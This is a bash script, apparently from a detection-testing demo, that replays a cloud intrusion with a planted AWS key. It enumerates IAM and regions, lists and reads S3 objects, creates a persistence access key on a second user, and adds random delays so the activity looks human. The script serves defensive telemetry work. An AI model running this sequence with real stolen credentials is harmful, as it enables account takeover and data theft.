#!/bin/bash
# The attack sequence, run on the egress host.
#
# Rendered with a run id and the discovery regions, delivered by SSM Run Command,
# and executed as the instance's own shell. Every call here is a genuinely benign
# AWS API call made with the leaked key -- real CloudTrail records all of it, which
# is the whole point. Nothing is destructive: the sequence reads, enumerates, and
# creates exactly one access key on a second identity for persistence.
#
# The key itself is never passed as a command parameter, because SendCommand
# records its parameters in the caller's CloudTrail and that would publish the
# leaked credential into the very telemetry the demo is about. The host fetches it
# from Secrets Manager with its own instance role instead.
#
# Output is one JSON object per call to stdout, then a ---SUMMARY--- sentinel and a
# final object. The orchestrator parses the tail after the sentinel; a missing
# sentinel means the script died partway and is a loud failure rather than a
# partial success mistaken for a whole one.
set -uo pipefail

SECRET_ID="__SECRET_ID__"
REGION_HOME="__REGION_HOME__"
REGION_SECRET="__REGION_SECRET__"
DISCOVERY_REGIONS="__DISCOVERY_REGIONS__"
EXPORTS_BUCKET="__EXPORTS_BUCKET__"
PERSISTENCE_USER="__PERSISTENCE_USER__"
OBJECT_KEYS="__OBJECT_KEYS__"

# The leaked key, fetched by the instance role. Never printed.
# The secret lives in the egress account's region, not the demo account's. These
# differ, and using the wrong one returns ResourceNotFound -- which looks like a
# staging failure rather than the region mismatch it is.
creds=$(aws secretsmanager get-secret-value --secret-id "$SECRET_ID" \
  --region "$REGION_SECRET" --query SecretString --output text 2>/dev/null)
if [ -z "$creds" ]; then
  echo '{"fatal":"could not read the leaked key from Secrets Manager"}'
  echo "---SUMMARY---"
  echo '{"ok":false,"reason":"no credential"}'
  exit 1
fi
export AWS_ACCESS_KEY_ID=$(echo "$creds" | python3 -c 'import json,sys;print(json.load(sys.stdin)["AccessKeyId"])')
export AWS_SECRET_ACCESS_KEY=$(echo "$creds" | python3 -c 'import json,sys;print(json.load(sys.stdin)["SecretAccessKey"])')
unset AWS_SESSION_TOKEN

# A freshly minted access key can take several seconds to become usable -- IAM is
# eventually consistent, and the first call with a brand-new key often returns
# InvalidClientTokenId. Retry GetCallerIdentity with backoff before doing anything
# else, so the sequence does not fail on a race that has nothing to do with it.
identity=""
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  identity=$(aws sts get-caller-identity --region "$REGION_HOME" --output json 2>/dev/null) && break
  sleep 6
done
if [ -z "$identity" ]; then
  echo '{"fatal":"leaked key never became usable"}'
  echo "---SUMMARY---"
  echo '{"ok":false,"reason":"key not propagated"}'
  exit 1
fi

emit() { echo "{\"step\":\"$1\",\"region\":\"$2\",\"ok\":$3}"; }

# Jittered delay between calls, so the timeline reads as human/scripted rather than
# a machine-gun burst that no real intrusion produces. 2-15 seconds.
jitter() { sleep "$(python3 -c 'import random;print(round(random.uniform(2,15),1))')"; }

count_ok=0
count_fail=0
run() {
  local label="$1" region="$2"; shift 2
  if "$@" >/dev/null 2>&1; then emit "$label" "$region" true; count_ok=$((count_ok+1))
  else emit "$label" "$region" false; count_fail=$((count_fail+1)); fi
  jitter
}

# 1. Confirm the key works and see who it belongs to.
emit "GetCallerIdentity" "$REGION_HOME" true
jitter

# 2. Cloud discovery. What can this identity see about the account it landed in.
run "GetAccountAuthorizationDetails" "$REGION_HOME" \
  aws iam get-account-authorization-details --region "$REGION_HOME"
run "ListUsers" "$REGION_HOME" aws iam list-users --region "$REGION_HOME"
run "ListRoles" "$REGION_HOME" aws iam list-roles --region "$REGION_HOME"

# 3. Cross-region enumeration -- the classic anomaly. DescribeInstances in regions
#    the organization does not use. These succeed because the SCP deliberately
#    permits read-only verbs everywhere; that they return nothing is itself the
#    signal.
for region in $DISCOVERY_REGIONS; do
  run "DescribeInstances" "$region" aws ec2 describe-instances --region "$region"
done

# 4. Find and enumerate the data.
run "ListBuckets" "$REGION_HOME" aws s3api list-buckets --region "$REGION_HOME"
run "ListObjects" "$REGION_HOME" \
  aws s3api list-objects-v2 --bucket "$EXPORTS_BUCKET" --region "$REGION_HOME"

# 5. Read a few objects. These are S3 data events -- invisible to Event History,
#    which is why the trail delivers them to CloudWatch Logs.
for key in $OBJECT_KEYS; do
  run "GetObject" "$REGION_HOME" \
    aws s3api get-object --bucket "$EXPORTS_BUCKET" --key "$key" \
    --region "$REGION_HOME" /tmp/obj-out
done

# 6. Persistence. Mint an access key on a *second* identity. This is the action
#    the simulated SOAR will miss, and the one the harness is meant to catch.
run "CreateAccessKey" "$REGION_HOME" \
  aws iam create-access-key --user-name "$PERSISTENCE_USER" --region "$REGION_HOME"

echo "---SUMMARY---"
echo "{\"ok\":true,\"calls_ok\":$count_ok,\"calls_failed\":$count_fail,\"persistence_user\":\"$PERSISTENCE_USER\"}"
